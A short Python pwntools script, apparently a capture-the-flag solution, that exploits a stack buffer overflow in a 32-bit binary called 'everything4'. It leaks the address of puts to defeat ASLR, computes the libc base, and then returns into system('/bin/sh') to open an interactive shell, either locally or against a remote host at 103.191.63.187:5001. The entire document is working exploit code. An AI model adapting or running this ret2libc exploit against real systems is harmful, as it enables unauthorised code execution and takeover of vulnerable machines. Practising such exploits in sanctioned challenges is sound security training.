#!/usr/bin/env python3

from pwn import *

PATH = './everything4'

HOST = '103.191.63.187'
PORT = 5001

def exploit(r):
    payload  = b'A' * 0x7f4
    payload += p32(elf.sym.puts)
    payload += p32(elf.sym.main)
    payload += p32(elf.got.puts)

    r.recvlines(2)
    r.sendline(payload)

    puts = u32(r.recvline(0))

    libc.address = puts - libc.sym.puts

    info(f'puts: {hex(puts)}')
    info(f'libc: {hex(libc.address)}')

    payload  = b'A' * 0x7f4
    payload += p32(libc.sym.system)
    payload += p32(elf.sym.main)
    payload += p32(next(libc.search(b'/bin/sh')))

    r.recvlines(2)
    r.sendline(payload)

    r.interactive()

if __name__ == '__main__':
    elf = ELF(PATH, checksec=True)
    libc = ELF("./libc.so.6", checksec=True)

    if args.REMOTE:
        r = remote(HOST, PORT)
    else:
        r = elf.process(aslr=False, env={})
    exploit(r)